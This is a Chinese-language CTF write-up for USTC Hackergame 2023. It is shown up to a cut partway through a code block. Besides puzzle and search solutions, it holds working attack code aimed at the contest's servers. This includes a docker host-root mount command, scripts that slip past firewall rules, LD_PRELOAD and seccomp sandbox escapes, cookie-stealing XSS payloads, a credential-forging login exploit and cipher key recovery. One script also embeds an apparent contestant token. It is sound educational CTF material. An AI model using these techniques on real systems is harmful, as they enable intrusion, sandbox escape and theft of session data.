> 文章内容以 [此处的版本](https://benpigchu.github.io/pikanote/article/ustc-hackergame-2023-writeup.html) 为准，本仓库的版本为赛后直接提交的版本，之后若有修正可能不会在这边同步。
> 本文的协议为 [CC-BY-4.0](https://github.com/benpigchu/pikanote/blob/master/LICENSE)，与本仓库的默认协议（CC-BY-NC-SA-4.0）相比宽松一些。

# USTC Hackergame 2023 Writeup

一年一度的 USTC Hackergame 又开始了。今年的比赛比去年稍微晚了一些。和往年一样，今年也是每做一题就写一题的 Writeup，这样就不会因为比赛结束之后没有动力写而咕掉了。

以下按照解题时间顺序排序，有多个小题的，各小题分开排列。为了简单，题目本身的描述我就不写在 Writeup 里了，大家可以去 [官方 Writeup](https://github.com/USTC-Hackergame/hackergame2023-writeups) 查看。

## Hackergame 启动

和往年一样，相似度写在 URL search param 里了，所以我直接按照要求填入 100。

其实理论上应该可以直接把示例音频传上去……但是按照官方题解，居然是比较波形图像素颜色，这样就做不到那么高的准确率了，可恶。

## 异星歧途

因为想要抢首杀所以先做这个，当然最后也抢到了。

开关分成了 4 组，分别是不同的谜题。

首先是第一组，在开关旁边的微型处理器中写明了逐位判断逻辑，直接把 `if` 语句的内容提取出来反过来就好，得到序列是 10100101。

其次是第二组，在开关旁边的逻辑处理器中将8个按钮汇总成了二进制数，检查的逻辑是，需要二进制数是一个不大于 256 的平方数，并且最高位和第六高位为1。由此得到序列是 11000100。

然后是第三组，是游戏机制谜题。要想不爆炸，首先要把第八个开关和前一组的最后一个开关设为一致，否则发电机会因为冷却不足而爆炸。其次要保证冷冻液正常生产，所以应当关闭漏液体的管道、阻止原料钛运输的传送带门，启动抽水机和冷冻液混合器。最后打开反应堆启动加入钍就可。另外为了避免抢电，需要关闭攻击建筑。得到序列是 10001100。

然后是第四组，是模拟电路题，由于可以清楚得看到电路中间的过程，逐位试错即可，得到序列是 01110111。

提交序列即可得到 flag。Mindustry 是个好游戏，可惜我没怎么玩过。

## 猫咪小测

惯例的搜索引擎使用技巧考试。

- 对于第一题，在 [西区图书馆简介](https://lib.ustc.edu.cn/%E6%9C%AC%E9%A6%86%E6%A6%82%E5%86%B5/%E5%9B%BE%E4%B9%A6%E9%A6%86%E6%A6%82%E5%86%B5%E5%85%B6%E4%BB%96%E6%96%87%E6%A1%A3/%E8%A5%BF%E5%8C%BA%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AE%80%E4%BB%8B/)（我去，中文URL）中可以看到，外文书库在 12 楼。
- 对于第二题，在 arXiv 中搜索可以得到 [原始论文](https://arxiv.org/abs/2303.17626)，直接在摘要中可以看到答案为 23。
- 对于第三题，直接搜索可以找到 [对应的选项](https://cateee.net/lkddb/web-lkddb/TCP_CONG_BBR.html) 是 `CONFIG_TCP_CONG_BBR`。
- 对于第四题，可以直接搜索到 [原始论文](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf)，文件中标明了会议为 ECOOP。

和去年一样，可以爆破前两题。

## 更深更暗

打开 Devtool 即可看到 flag。

## 赛博井字棋

只需要在 Devtool 中魔改请求就能在已经有子的格子中落子，具体的就是在请求里复制请求为 fetch，然后粘贴到控制台发送，然后就能在请求的返回里拿到 flag。

顺带一提，井字棋只要双方都够强可以保证平局。

## 🪐 小型大语言模型星球 - You Are Smart

我不知道，我输入了 "Am I smart?" 就直接拿到 flag 了。

## 组委会模拟器

拿出我的 TamperMonkey，写脚本自动点击消息。代码如下：

```js
const check=()=>{
	[...document.querySelectorAll(".fakeqq-message__bubble")].forEach((e)=>{
		if(/hack\[[a-z]*\]/.test(e.innerHTML)){
			e.click()
		}
	})
}
setInterval(check,100)
```

## 奶奶的睡前 flag 故事

这不是著名的 CVE-2023-21036 嘛，直接使用 [这个工具](https://acropalypse.app/)，使用自定义分辨率把宽度设置为 1080，即可得到答案。

## 虫

这不是 SSTV 嘛。我这里使用 [RX-SSTV](https://rx-sstv.software.informer.com/1.4/)，然后耳机对准麦克风进行解码直接就能得到答案。

## JSON ⊂ YAML? - JSON ⊄ YAML 1.1

根据 [这篇文章](https://john-millikin.com/json-is-not-a-yaml-subset)，JSON 的科学计数法允许指数部分不带符号，而 YAML 1.1 不允许。所以 YAML 1.1 会把 `1e2` 解析为字符串而不是像 JSON 一样解析为数字。注意原始的 YAML 1.1 规范中并没有详细定义这一点。

## JSON ⊂ YAML? - JSON ⊄ YAML 1.2

根据 [规范](https://yaml.org/spec/1.2.2/#mapping) YAML 1.2 不支持字典中有重复的键。所以提交 `{"a":"a","a":"a"}` 就好。

## Git? Git!

直接 `git reflog` 找到之前的 `HEAD` 然后 reset 过去即可获得 flag，在 README.md 中间。

## Docker for Everyone

根据 [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) ，直接运行 `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` 即可读取 flag 文件。

## HTTP 集邮册 - 5 种状态码

直接提交获得 `200 OK`。

删除 `HTTP` （但不删除后面的版本号）得到 `400 Bad Request`。

把 `GET` 改成 `GT` 得到 `405 Method Not Allowed`。

添加 `Range: bytes=0-1` 标头可以得到 `206 Partial Content`。

添加 `Expect: 100-continue` 标头可以得到 `100 Continue`。

## 🪐 低带宽星球 - 小试牛刀

直接使用 [tinypng](https://tinypng.com/) 就可以获得所需的图片文件。

## 🪐 高频率星球

直接暴力解析 asciinema 文件，提取录制的输出，再把 `less` 输出的控制字符去掉，即可还原 `flag.js`。代码如下：

```js
const fs=require("fs")
const data=fs.readFileSync("asciinema_restore.rec","utf-8").split("\n").filter(l=>l.trim()!=="").map(l=>JSON.parse(l))

let raw=data.filter(l=>l[1]==="o"&&l[0]>=6.9268&&l[0]<=62&&l[2]!=="\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6\u001b[K~\b~\r\u001b[K").map(l=>l[2]).join("")

raw=raw.replaceAll("\u001b[7mflag.js\u001b[27m\u001b[K","")
raw=raw.replaceAll(":\u001b[K","")
raw=raw.replaceAll("\u001b[K~\b~\r\u001b[K","")
raw=raw.replaceAll("\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6","")
raw=raw.replaceAll("\u001b[7m(END)\u001b[27m\u001b[K","")

console.log(raw)
```

## HTTP 集邮册 - 没有状态……哈？

我们使用 HTTP 0.9，也就是直接把 `HTTP/1.1` 直接干掉，这样就没有状态码了！

## HTTP 集邮册 - 12 种状态码

将 HTTP 版本改为 2.0 可以得到 `505 Version Not Supported`。

将路径改为 `/A` 可以得到 `404 Not Found`。

将路径改得足够长可以得到 `414 URI Too Long`。

添加 `If-Match:"1"` 标头可以得到 `412 Precondition Failed`。

添加 `If-None-Match:"<此处填入正确的ETag>"` 标头可以得到 `304 Not Modified`。

添加 `Range: bytes=1000000-1"` 标头可以得到 `416 Range Not Satisfiable`。

添加 `Transfer-Encoding: compress` 标头可以得到 `501 Not Implemented`。

赛后看官方题解才知道可以有 `413 Content Too Large`，尝试的时候只想到了 payload，没想到可以直接改 `Content-Length` 标头。

## 惜字如金 2.0

比去年的同名题目简单不少。代码是单表替换，只是密码表的部分被惜字如金掉了，并且每行都只去除了一个字母。根据 flag 开头结尾的格式以及中间不含花括号的性质可以轻易复原部分的密码表，至于剩下的部分，就不影响答案了。

有一说一，这题与其放 Hackergame，不如放 CCBC 这样的 Puzzle Hunt，毕竟纯靠推理也能得到答案。

## 🪐 流式星球

可以直接通过 ffmpeg 将像素流编码成可以播放的视频，但是我们还需要知道相关的参数。题目给出的由脚本可知，像素格式为 `rgb24`，那么我们接下来只需要知道一帧的长宽了。可以通过以下命令提取第一帧作为尝试：

```bash
ffmpeg -f rawvideo -pix_fmt rgb24 -s:v 1920x1080 -r 1 -i video.bin  -frames:v 1 video.png -y
```

然后由于一般视频相邻的像素相似，而相邻的帧也相似，所以可以通过在图像编辑软件内测量来获得正确的视频尺寸，最后复原视频即可，命令如下：

```bash
ffmpeg -f rawvideo -pix_fmt rgb24 -s:v 427x759 -r 24 -i video.bin video.mp4 -y
```

但是，为什么，为什么要在这里放春日影名场面啊！

## 旅行照片 3.0 - 神秘奖牌

惯例的社会工程学题。注意本次的图片加上了标识选手的水印，同时抹除了 EXIF 信息。另外今年的问题也难上很多。

搜索奖牌上的文本可以知道，这是 2002 年物理学诺贝尔奖的奖牌。查询拉面店的店名可知，这家拉面店是 [东京大学附近的一信拉面店](https://maps.app.goo.gl/QNAAJ3RDYDSS5DoB9)，可知学长去东京大学留学了。查询附近的博物馆，可以查到上野公园附近的的博物馆群，在附近可以找到 [喷泉图片的拍摄位置](https://maps.app.goo.gl/hHBEMKN9MWRhGQRH8)，马路对面的博物馆应当是 [东京国立博物馆](https://maps.app.goo.gl/6zmwRN3TVEmsmkgj8)

用日文搜索 “東京大学 ノーベル賞” 可以找到 [东京大学理学部的诺贝尔奖展示介绍页](https://www.s.u-tokyo.ac.jp/ja/gallery/nobelprize/)。页面中记载的三位诺贝尔奖得主中包含了图片上的 2002 年物理学诺贝尔奖牌的得主小柴昌俊。页面中出生最晚的是 2015 年物理学诺贝尔奖牌得主梶田隆章，其研究所为东京大学宇宙射线研究所，缩写为 ICRR。

由于上野公园的活动众多，第一题我采取了爆破，毕竟今年暑假也不过几十天而已。爆破得到当日是 2023 年 8 月 10 日。

## 旅行照片 3.0 - 这是什么活动？

在 [搜到的活动列表](https://www.uenopark.info/ad2023/) 中查询可以得到，当天在上野公园正在进行的活动是 [东京全国梅酒祭](https://umeshu-matsuri.jp/tokyo_ueno/)，在其 [招募志愿者的的页面](https://umeshu-matsuri.jp/tokyo_staff/) 可以看到在线问卷的链接，编号为 S495584522。

根据 [东京大学学生福利介绍页](https://www.u-tokyo.ac.jp/ja/students/facility/h17.html)，学长可以免费参观东京国立博物馆，花费 0 日元。

## Komm, süsser Flagge - 我的 POST

鉴于规则是拒绝含有`POST` 的 tcp 包，我们只需要把请求在开头的 `POST` 中间分成两个TCP包就好了。代码如下

```py
import pwn

token=b"<token>"

conn = pwn.remote('202.38.93.111',18080)
conn.send(b'PO')
conn.send(b'ST / HTTP/1.1\r\nHost:202.38.93.111\r\nContent-Length: <token length>\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n')
conn.send(token)
conn.interactive()
```

## Komm, süsser Flagge - 我的 P

规则应当是是拒绝内容以 `P` 开头的 tcp 包。然而，由于和 [这篇文章](http://www.stearns.org/doc/iptables-u32.current.html) 中描述的实现相比，取 TCP 数据指针的时候移位后忘记加 Mask 了，所以如果我们把数据指针后面的两位（刚好是保留位）设为非 0，我们就能绕过这个规则。

我这里使用了 `scapy` 进行发包。我从 `scapy` 的源码里把 `TCP_client` 这个类进行了修改，让它初始化包的时候把保留位全部设置为 1，也就是：

```py
self.l4[TCP].reserved = 0b111
```

然后运行即可获得 flag：

```py
s=Custom_TCP_client.tcplink(Raw, '202.38.93.111',18081,debug=5)

token=b"<token>"
s.send(b'POST / HTTP/1.1\r\nHost:202.38.93.111\r\nContent-Length: <token length>\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n')
s.send(token)

print(raw(s.recv()))
```

不过我是 Windows 用户，自然没法像官方题解一样直接用 nftables，虽然 wsl 可能能用。

## Komm, süsser Flagge - 我的 GET

鉴于所有包的前五十个字节中都必须含有 `GET / HTTP`，我们只能增大 TCP 包内的数据指针，在数据之前空出一些字节来放这个字符串了。刚好，TCP 的 options 字段就可以放自定义的内容。

和上一小题同样使用 `scapy`，在初始化的时候加入自定义 options：

```py
self.l4 = IP(dst=ip) / TCP(sport=self.sport, dport=self.dport, flags=0,
	seq=random.randrange(0, 2**32),options=[(16,b'GET / HTTP')])
```

然后运行即可获得 flag：

```py
s=Custom_TCP_client.tcplink(Raw, '202.38.93.111',18082,debug=5)

token=b"<token>"
s.send(b'POST / HTTP/1.1\r\nHost:202.38.93.111\r\nContent-Length: <token length>\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n')
s.send(token)

print(raw(s.recv()))
```

## 为什么要打开 /flag 😡 - LD_PRELOAD, love!

显而易见，只需要我们手动进行系统调用，那么 `LD_PRELOAD` 就管不着我们。代码如下：

```c
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

int main(){
	char* filename="./flag";
	int flags=O_RDONLY;
	int mode=0;
	int fd;
	int sys_open=2;
	__asm__(
		"syscall"
		:"=a"(fd)
		:"0"(sys_open),"D"(filename),"S"(flags),"d"(mode)
        : "rcx", "r11", "memory"
	);
	while(1){
		char buffer[64]={};
		int size=read(fd,buffer,64);
		write(1,buffer,size);
		if(size<64){
			break;
		}
	}
	return 0;
}
```

## 为什么要打开 /flag 😡 - 都是 seccomp 的错

题目的代码写明了它修改自 Crate.io 上的 greenhook 库，和 [它的源码](https://www.taoky.moe/greenhook/src/greenhook/lib.rs.html) 对比可以发现 `continue_syscall` 上的 `unsafe` 和注释消失了。而这便提示我们，如果我们打开的路径在 Supervisor 检查和内核处理之间发生变化的话，那么便可以绕过 Supervisor 的检查。可以参考 [这段文档](https://man.archlinux.org/man/seccomp_unotify.2.en#Design_goals;_use_of_SECCOMP_USER_NOTIF_FLAG_CONTINUE)。不过具体实现上需要注意，由于现代 libc 里面的 `pthread_create` 使用的 `clone3` 系统调用并没有被允许，所以我只能手搓一个 `clone` 系统调用来起线程修改文件名。代码如下：

```c
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdatomic.h>
#define _SCHED_H 1
#define __USE_GNU 1
#include <bits/sched.h>
#include <linux/sched.h>

char filename[7]="./elag";

int blinker(void*ptr){
	while(1){
		filename[2]='f';
		atomic_thread_fence(memory_order_seq_cst);
		filename[2]='e';
		atomic_thread_fence(memory_order_seq_cst);
	}
}

int main(){
    void *child_stack = malloc(4096);
	clone(&blinker,child_stack+4096,CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM
			   | CLONE_SIGHAND | CLONE_THREAD
			   | CLONE_SETTLS | CLONE_PARENT_SETTID
			   | CLONE_CHILD_CLEARTID
			   | 0,NULL);
	int i=0;
	while(i<100){
		int fd=open(filename,O_RDONLY);
		atomic_thread_fence(memory_order_seq_cst);
		while(1){
			char buffer[64]={};
			int size=read(fd,buffer,64);
			write(1,buffer,size);
			if(size<64){
				break;
			}
		}
		i++;
	}
	return 0;
}
```

## 微积分计算小练习 2.0

首先，我们发现后端生成评论的时候是字符串拼接 JavaScript 实现的，于是如果我们评论 `"+document["cookie"]+"` 的话便可以在页面内显示我们的 cookie。但是这不够劲爆，能做的事情太有限了。

其次我们可以在给 Bot 提交的 HTML 文件里打开提交页面，并指定窗口的 `name`。那么我们就可以把 XSS Payload 放在 `name` 里，并评论 `"+window["name"]+"`，这样就能执行任意代码了！

最后我们需要获取 flag，直接使用就好评论框提交就好，但是由于 flag 有点长，所以可能需要分多次提取，另外还需要绕开字符种类限制。

那么我们首先评论 `"+window["name"]+"`，然后提交以下 HTML：

```html
<script>window.open("http://web/result",`<img src="/" onerror="document.querySelector('form #comment').value=btoa(document.cookie).length;document.querySelector('form').submit()">`)</script>
```

就可以得到 Base64 编码后的 flag 长度。然后再 `"+window["name"]+"`，然后提交以下 HTML：

```html
<script>window.open("http://web/result",`<img src="/" onerror="document.querySelector('form #comment').value=btoa(document.cookie).slice(0,20);document.querySelector('form').submit()">`)</script>
```

就可以得到 Base64 编码后的 flag 的前 20 个字符，然后重复多次之后即可得到编码后的完整 flag。需要注意的是 JS 的 `decodeURIComponent` 无法给出正确的 flag，因为他不会像 Python 的 `urllib.parse.unquote_plus` 一样把 `+` 转换回空格。

## O(1) 用户登录系统

由于没有检查后面的 prove 的长度，所以如果管理员用户凭据 `admin` 和一个普通用户 `x` 的用户凭据满足 `sha1(admin)` 和 `sha1(x)` 组合之后依旧是一个合法的用户凭据 `new`，那么就可以把 `new` 和随便一个用户凭据 `a` 导入进来，就可以用 `admin` 和 `sha1(x)` 与 `sha1(a)` 组合的结果登陆管理员账号。

然而想要找到符合条件的 `admin` 和 `x` 较为困难，不过还好是可以接受的计算量，然而具体的要求比较难以推测。搜索的代码如下：

```py
from hashlib import sha1

# prefix=b"admin:"
# target_count=1

prefix=b"x:"
target_count=0

def check_usable(hash,target_count):
	count=0
	for b in hash:
		if b==ord('\r') or b==ord('\n') or b==ord('\x04') or b==ord('\x1c') or b>=0x80:
			return False
		if b==ord(':'):
			count+=1
	return count==target_count and hash.decode().encode() == hash

i=0

while True:
	if(check_usable(sha1(prefix+str(i).encode()).digest(),target_count)):
		print(prefix+str(i).encode())
		print(sha1(prefix+str(i).encode()).digest())
		break
	if i%1000000==0:
		print(i)
	i+=1
```

然后最后与题目交互的代码如下：

```py
import pwn
from hashlib import sha1

token=b"<token>"

admin=b'admin:1690553'
sha1_admin=sha1(admin).digest()
x=b'x:11555829'
sha1_x=sha1(x).digest()
a=b'a:b'
sha1_a=sha1(a).digest()

conn = pwn.remote('202.38.93.111',10094)
conn.send(token)
conn.send(b"\n")

conn.recvuntil(b"Choice: ")
conn.send(b"1\n")
conn.recvuntil(b"> ")
hash1 = sha1_admin
hash2 = sha1_x
if hash1 > hash2:
	hash1, hash2 = hash2, hash1
conn.send(hash1 + hash2)
conn.send(b"\n")
conn.send(a)
conn.send(b"\n")
conn.send(b"EOF\n")
conn.recvuntil(b"Choice: ")
conn.send(b"2\n")
conn.recvuntil(b"Login credential: ")
conn.send(admin.decode()+":"+sha1_x.hex()+sha1_a.hex())
conn.send(b"\n")

conn.interactive()
```

## 逆向工程不需要 F5

你说得对，但是 Ghidra 是一款……后面忘了，总之是没有 F5 这个快捷键的。然而，程序分散到 16 个动态链接库里了，给我们的分析带来了一些不便。所以为了理解程序是怎么运行的，我用 x64dbg 进行了动态调试。当然，之后会发现这些函数并没有遵循一般的调用约定，所以直接看反编译并不能看出正确的内容。

首先，程序获取了输入（这个过程使用了 libs11 中的函数与 libs14 中的常量），检查了输入格式，输入需要以 `flag{` 开头，同时第 0x25 个字符需要为 `}`（这个过程使用了 libs15 中的常量）。这意味着 flag 括号内的部分应当有 32 个字符。然后，程序调用了 libs08 中的函数将大括号内的东西提取出来。

接下来，程序将对输入内容进行一大堆变换。

首先是一个四次的循环。每次的循环内容是进行一个两次的循环。在这个两次的循环中，首先将外层循环的次数乘以 16 后与 `0x55AA00FF` 异或（这个过程调用了 libs10 和 libs13 中的函数）得到 `m`，然后在循环中分别操作前 16 字节和后 16 字节。具体的操作是将 `m` 直接乘到要操作的 16 字节上去（这个过程调用了 libs03 和 libs07 中的函数）。最后，还使用了 libs12 中的函数维护循环进度。

然后是又一个四次的循环。这次是把内容分为八段分别与 `0x7A026655FD263677` 进行异或。（这个过程调用了libs05、libs13、libs12 中的函数）

然后是又一个四次的循环。每次的循环内容是进行一个八次的循环。在这个八次的循环中，首先将外层循环的次数乘以 4 后与 `0xDEADBEEF` 异或（这个过程调用了 libs10 和 libs13 中的函数）得到 `m`，然后在循环中分别操作每 4 个字节。具体的操作是将 `m` 直接乘到要操作的 4 字节上去（这个过程调用了 libs02 和 libs09 中的函数）。还使用了 libs12 中的函数维护循环进度。

然后是一个十六次的循环。这次是把内容分为八段分别与 `0xCDEC` 进行异或。（这个过程调用了libs01、libs13、libs12 中的函数）

最后是又一个四次的循环。每次的循环内容是进行一个三十二次的循环。在这个三十二次的循环中，首先将外层循环的次数乘以 2 后 `0x21` 异或（这个过程调用了 libs10 和 libs13 中的函数）得到 `m`，然后在循环中分别操作每个字节。具体的操作是将 `m` 直接乘到要操作的字节上去（这个过程调用了 libs00 和 libs06 中的函数）。还使用了 libs12 中的函数维护循环进度。不过特别的是，在最后一次循环时，会在计算完成后检查计算结果，具体的是和 libs12 中数值的进行比较（这个过程调用了 libs04 中的函数）。

翻译过来是这样的：

```py
flag=bytearray(b"1234567890abcdef1234567890abcdef")
target=bytearray([0x9F,0x87,0x77,0xC2,0x84,0x2E,0x37,0xD9,0xB8,0xB9,0xB9,0x53,0xE8,0x28,0x13,0x44,0xAF,0xAB,0x40,0xAC,0x62,0x6C,0x23,0xFF,0x8B,0xAA,0xCA,0xFC,0x0E,0xB1,0xE2,0xB4])

for i in range(4):
	for j in range(2):
		m=0x55AA00FF ^ (16*i)
		f=(int.from_bytes(flag[0+16*j:16+16*j],byteorder='little')*m) & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
		flag[0+16*j:16+16*j]=f.to_bytes(16,'little')
for i in range(4):
	x=(int.from_bytes(flag[0+8*i:8+8*i],byteorder='little'))^0x7A026655FD263677
	flag[0+8*i:8+8*i]=x.to_bytes(8,'little')
for i in range(4):
	for j in range(8):
		m=0xDEADBEEF ^ (4*i)
		f=(int.from_bytes(flag[0+4*j:4+4*j],byteorder='little')*m) & 0xFFFFFFFF
		flag[0+4*j:4+4*j]=f.to_bytes(4,'little')
for i in range(16):
	x=(int.from_bytes(flag[0+2*i:2+2*i],byteorder='little'))^0xCDEC
	flag[0+2*i:2+2*i]=x.to_bytes(2,'little')
for i in range(4):
	for j in range(32):
		m=0x21 ^ (2*i)
		f=(int.from_bytes(flag[0+1*j:1+1*j],byteorder='little')*m) & 0xFF
		flag[0+1*j:1+1*j]=f.to_bytes(1,'little')

print(flag==target)
```

那么反过来：
```py
flag=bytearray([0x9F,0x87,0x77,0xC2,0x84,0x2E,0x37,0xD9,0xB8,0xB9,0xB9,0x53,0xE8,0x28,0x13,0x44,0xAF,0xAB,0x40,0xAC,0x62,0x6C,0x23,0xFF,0x8B,0xAA,0xCA,0xFC,0x0E,0xB1,0xE2,0xB4])

for i in range(4):
	for j in range(32):
		m=0x21 ^ (2*(3-i))
		f=(int.from_bytes(flag[0+1*j:1+1*j],byteorder='little')*pow(m,-1,2**8)) & 0xFF
		flag[0+1*j:1+1*j]=f.to_bytes(1,'little')
for i in range(16):
	x=(int.from_bytes(flag[0+2*i:2+2*i],byteorder='little'))^0xCDEC
	flag[0+2*i:2+2*i]=x.to_bytes(2,'little')
for i in range(4):
	for j in range(8):
		m=0xDEADBEEF ^ (4*(3-i))
		f=(int.from_bytes(flag[0+4*j:4+4*j],byteorder='little')*pow(m,-1,2**32)) & 0xFFFFFFFF
		flag[0+4*j:4+4*j]=f.to_bytes(4,'little')
for i in range(4):
	x=(int.from_bytes(flag[0+8*i:8+8*i],byteorder='little'))^0x7A026655FD263677
	flag[0+8*i:8+8*i]=x.to_bytes(8,'little')
for i in range(4):
	for j in range(2):
		m=0x55AA00FF ^ (16*(3-i))
		f=(int.from_bytes(flag[0+16*j:16+16*j],byteorder='little')*pow(m,-1,2**128)) & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
		flag[0+16*j:16+16*j]=f.to_bytes(16,'little')

print(flag)
```

如此便可以得到 flag 的内容。

注意由于这里的汇编十分地不符合通常的调用约定，所以就连 Ghidra 的反编译器也救不了，不过还好汇编写得还有点可读，借助动态调试还是能搞明白它在做什么的。

不过要是能想到像官方题解一样用 angr 就能少花很多时间了。

## 小 Z 的谜题

仔细阅读代码发现，这个问题等效于给出 16 个尺寸一定的长方体，将他们装到一个边长为 5 的立方体里。注意到立方体的体积刚好可以装满，而除了三个 1x1x3 的长方体以外，剩下的长方体的三个边长中都有两个是偶数，这意味着我们可以利用各种奇偶性分析这三个 1x1x3 的长方体的位置。

首先把边长为 5 的立方体分为 5 层，每层分别棋盘染色，可以知道一定要有 1x1x3 的长方体可以影响这一层的奇偶性才能保证填满。而三个方向一共 15 层，而每个 1x1x3 的立方体最多影响三个方向 5 层的奇偶性，所以三个 1x1x3 的长方体的在三个坐标轴上的投影均两两不重合。再加上三个长方体在每个层的位置的奇偶性要求，很快便能推出除了对称的情况以外只有唯一的一种方式放置这三个立方体。在之后只需要打开 Minecraft 手动拼一下就能做出一组解。

我手动拼出来的解的分数为 154。

可惜我没有像官方题解一样搜到 Conway Puzzle。

然而，如果要做剩下两个小题就得用搜索算法了。调查了各种方案，比如现成的 [Burr-Tools](https://burrtools.sourceforge.net/)，在我的机器上可以在 5 分钟之内给出所有的拼法，然而他并没有导出解的功能，想手动改源码编译又十分痛苦，于是放弃。当然最终 Flag 里提到的 [X算法](https://en.wikipedia.org/wiki/Knuth%27s_Algorithm_X)，也有看到，事实上前面的 Burr-Tools 就用了这个算法（加上若干针对特定问题的优化）。最终采取的方案还是直球 z3，毕竟标题写了小 z 嘛，不过。代码如下：

```py
import itertools
import z3

bound = 5

def gen_intervals(constraint):
	u,v,w=constraint
	p=set([(u,v,w),(u,w,v),(v,u,w),(v,w,u),(w,u,v),(w,v,u)])
	l=[]
	for x,y,z in p:
		for i in range(bound-x+1):
			for j in range(bound-y+1):
				for k in range(bound-z+1):
					l.append([[i,i+x],[j,j+y],[k,k+z]])
	return l
constraints = ((1, 1, 3),(1, 4, 4),(1, 2, 4),(2, 2, 3),(2, 2, 2),(1, 2, 2))
count = [3,2,2,3,2,4]
num_dims = len(constraints[0])
options = []
for i in range(len(constraints)):
	intervals=gen_intervals(constraints[i])
	if i==0:
		options.append([[[4,5],[0,1],[2,5]]])
		options.append([[[1,4],[1,2],[1,2]]])
		options.append([[[0,1],[2,5],[0,1]]])
	else:
		for _ in range(count[i]):
			options.append(intervals)

s = z3.Solver()
variables=[]
for i in range(len(options)):
	var=[]
	for p in range(len(options[i])):
		v=z3.Bool(f'x_{i}_{p}')
		for pv in var:
			s.add(z3.Not(z3.And(pv,v)))
		var.append(v)
	s.add(z3.Or(*var))
	variables.append(var)

print("[====]1")
for i in range(len(options)):
	for j in range(i+1,len(options)):
		for p in range(len(options[i])):
			for q in range(len(options[j])):
				if not any((options[i][p][k][1] <= options[j][q][k][0] or options[j][q][k][1] <= options[i][p][k][0]) for k in range(num_dims)):
					s.add(z3.Not(z3.And(variables[i][p],variables[j][q])))

print("[====]2")
score = [[[[] for i in range(bound+2)] for j in range(bound+2)] for k in range(bound+2)]

for i in range(len(options)):
	for p in range(len(options[i])):
		for x, y, z in itertools.product([*options[i][p][0],bound+1],[*options[i][p][1],bound+1],[*options[i][p][2],bound+1]):
			score[x][y][z].append(variables[i][p])

print("[====]3")
scores=[]
for i in range(bound+2):
	for j in range(bound+2):
		for k in range(bound+2):
			scores.append(z3.Or(*score[i][j][k]))
result=z3.Sum(*(z3.If(sv,1,0) for sv in scores))

# s.add(result<=136)
s.add(result>=157)

print("[====]4")
print(s.check())
m=s.model()
for i in range(len(options)):
	for p in range(len(options[i])):
		if(m.evaluate(variables[i][p])):
			print(options[i][p])
print(m.evaluate(result))
```

注意我把纯粹推导出来的部分当作先验条件写进去了，以及获得输出之后还需要额外进行格式化。

不过官方题解提到说 sagemath 里面有 DLX 算法，这是我没有预料到的。

## 不可加密的异世界 2 - 希尔混淆

由于 xor 明文时用到的字符串全都是 ASCII 可打印字符，所以如果我们的输入是 `0x80` 的话，那么就能这个字节混淆之后是 xor 明文时用到的字符串对应字节直接加上这个数。由此我们便可以通过提交一个最高位均不为 1 的输入，再把其中一位最高改为 1，二者之差便是密钥矩阵对应行的 `0x80` 倍。为了防止输出含有 0 干扰我们获取结果，我们多次随机生成输入，这样就可以依靠概率获得不含 0 的输出。获得了密钥矩阵内容之后我们便可以直接解密输出后与输入异或获取 flag 了。代码如下：

```py
import pwn
import sage.all
from random import randrange

token=b"1221:MEQCIFUZ/2y/e8O8wIa3AJDVZ+6NYM9lyDA0uyvjRJQKLThfAiBs1P6CBODLEBfLMH/bS3bSHHhkmal32mhQjopy5AG4tA=="

base_mod = 2**8 + 1
base_ring = sage.all.GF(base_mod)

conn = pwn.remote('202.38.93.111',22000)
conn.recvuntil(b":")
conn.send(token)
conn.send(b"\n")

def random_input(size=128):
	while True:
		result=bytearray()
		for _ in range(size):
			result.append(randrange(0x80))
		for i in result:
			if i!=0:
				return bytearray(result)

def get_ciphertext(input_bytes):
	conn.recvuntil(b">")
	conn.send(input_bytes.hex().encode())
	conn.send(b"\n")
	conn.recvuntil(b"you ciphertext : ")
	return bytes.fromhex(conn.recv(256).decode())


matrix=[[None for _ in range(128)]for _ in range(128)]
ready_set=set()
while True:
	print("try")
	base_input=random_input()
	base_result=get_ciphertext(base_input)
	for index in range(128):
		print(index)
		modified_input=bytearray(base_input)
		modified_input[index]+=0x80
		# print(base_input.hex())
		# print(modified_input.hex())
		modified_result=get_ciphertext(modified_input)
		# print(base_result.hex())
		# print(modified_result.hex())
		for i in range(128):
			if base_result[i]!=0 and modified_result[i]!=0:
				diff=(modified_result[i]-base_result[i])%base_mod
				value=(-2*diff)%base_mod
				if (index,i) in ready_set:
					assert matrix[index][i]==value
				else:
					matrix[index][i]=value
					ready_set.add((index,i))
	if len(ready_set)>=128**2:
		break

key_matrix=sage.all.matrix(base_ring,matrix).transpose()
decrypt_key=key_matrix.inverse()

flag=None

while True:
	base_input=random_input()
	base_result=get_ciphertext(base_input)
	has_zero=False
	for i in range(128):
		if base_result[i]==0:
			has_zero=True
			break
	if not has_zero:
		sage_vec=sage.all.vector(base_ring,[m for m in base_result])
		decrypted=bytes(sage.all.vector(sage.all.ZZ,decrypt_key * sage_vec))
		flag=bytes((decrypted[i]^base_input[i] for i in range(128)))
		break

print(flag)
```

## 不可加密的异世界 2 - 希尔之核

这好办，任取一个密钥矩阵的一个本征值为 1 的 本征向量即可，题目的构造保证一定会有这样的。不过我们要小心不要让他们中有值为 256 的向量。为此我们只需要进行随机即可，毕竟不像第三部分，抽中的概率还挺大的。代码如下（接在上一小题代码的后面）：

```py
eigenspaces=key_matrix.eigenspaces_right(format='galois')
target_eigenspace=None
for eigenvalue,eigenspace in eigenspaces:
	if eigenvalue==1:
		target_eigenspace=eigenspace
		break

target_input=None
while True:
	random_vector=target_eigenspace.random_element()
	has_256=False
	all_zero=True
	for i in range(128):
		if random_vector[i]!=0:
			all_zero=False
